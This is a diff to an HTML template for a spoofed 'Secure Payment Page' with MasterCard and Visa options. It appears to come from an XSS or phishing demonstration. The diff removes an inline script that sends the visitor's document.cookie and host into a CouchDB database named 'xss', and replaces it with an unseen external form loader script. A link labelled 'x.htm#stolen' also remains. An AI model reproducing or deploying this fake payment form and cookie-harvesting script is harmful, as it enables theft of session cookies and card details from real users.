@@ -2,30 +2,30 @@
 <html>
     <head>
         <meta content="text/html; charset=UTF-8" http-equiv="content-type" />
-        <link href="{{ static }}/style/form.css" rel="stylesheet" type="text/css" />
+        <link href="{{ css }}/form.css" rel="stylesheet" type="text/css" />
     </head>
     <body>
         <h1>Select your payment method</h1>
         <ul>
             <li>
                 <input type="radio" name="method" value="mastercard" selected="selected" />
-                <img src="{{ static }}/img/mastercard.gif" /></li>
+                <img src="{{ img }}/mastercard.gif" /></li>
             <li>
                 <input type="radio" name="method" value="visacredit" />
-                <img src="{{ static }}/img/visacredit.gif" />
+                <img src="{{ img }}/visacredit.gif" />
             </li>
             <li>
                 <input type="radio" name="method" value="visadebit" />
-                <img src="{{ static }}/img/visadebit.gif" />
+                <img src="{{ img }}/visadebit.gif" />
             </li>
-            <li class="lock"><img src="{{ static }}/img/lock.gif" /></li>
+            <li class="lock"><img src="{{ img }}/lock.gif" /></li>
         </ul>
         <div>
             <table>
                 <tr class="head"><th colspan="2">Secure Payment Page</th></tr>
                 <tr class="head">
                     <td>Bulksms.net</td>
-                    <td><img src="{{ static }}/img/mastercardsecure.gif" alt="MasterCard SecureCode" /></td>
+                    <td><img src="{{ img }}/mastercardsecure.gif" alt="MasterCard SecureCode" /></td>
                 </tr>
                 <tr class="head">
                     <td>Payment Method:</td>
@@ -125,18 +125,7 @@
             <button>MAKE PAYMENT</button>
             <div class="poweredby">Powered By:<a href="x.htm#stolen">{{ host }}</a></div>
         </div>
-		
-		<script>
-		    var config = {
-		        db : "xss",
-                vendorjs : '{{ static }}/vendor/couchapp'
-		    };
-		</script>
-		<script src="{{ static }}/js/loader.js"></script>
-		<script src="{{ static }}/js/form.js"></script>
-		<script>
-			$.couch.db(config.db).saveDoc({host:location.host, cookies:document.cookie, date: (new Date().toUTCString())})
-		</script>
-		
+
+		<script src="{{formloader_js}}"></script>
     </body>
 </html>
